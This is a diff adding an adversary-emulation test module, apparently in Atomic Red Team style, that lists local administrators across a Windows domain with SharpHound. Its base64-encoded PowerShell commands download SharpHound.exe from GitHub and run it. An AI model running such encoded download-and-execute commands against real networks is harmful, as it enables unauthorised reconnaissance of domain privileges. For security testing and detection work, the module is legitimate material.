@@ -1,0 +1,19 @@
+- id: 084a8cc2-0d78-5f1a-bc5c-e3ec2e01f7b9
+  name: Soumaia ART Tests - SharpHound3 - LocalAdmin
+  description: This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)
+  tactic: discovery
+  technique:
+    attack_id: T1069.001
+    name: 'Permission Groups Discovery: Local Groups'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABTAGgAYQByAHAASABvAHUAbgBkAC4AZQB4AGUAIgApACAAewAgAGUAeABpAHQAIAAwACAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAEIAbABvAG8AZABIAG8AdQBuAGQAQQBEAC8AQgBsAG8AbwBkAEgAbwB1AG4AZAAvAGIAbABvAGIALwBlADAANgAyAGYAZQA3ADMAZAA3ADMAYwAwADEANQBkAGMAYwBiADMANwBmAGEAZQA1ADAAOAA5ADMANAAyAGQAMAAwADkAYgA4ADQAYgA4AC8AQwBvAGwAbABlAGMAdABvAHIAcwAvAFMAaABhAHIAcABIAG8AdQBuAGQALgBlAHgAZQA/AHIAYQB3AD0AdAByAHUAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFMAaABhAHIAcABIAG8AdQBuAGQALgBlAHgAZQAiAAoA
+          }
+          New-Item -Path "$env:TEMP\SharpHound\" -ItemType Directory > $null
+          & "$env:TEMP\ART-ExternalPayloads\SharpHound.exe" -d "$env:UserDnsDomain" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory "$env:TEMP\SharpHound\"
+        cleanup: |-
+          Remove-Item -Recurse $env:TEMP\SharpHound\ -ErrorAction Ignore
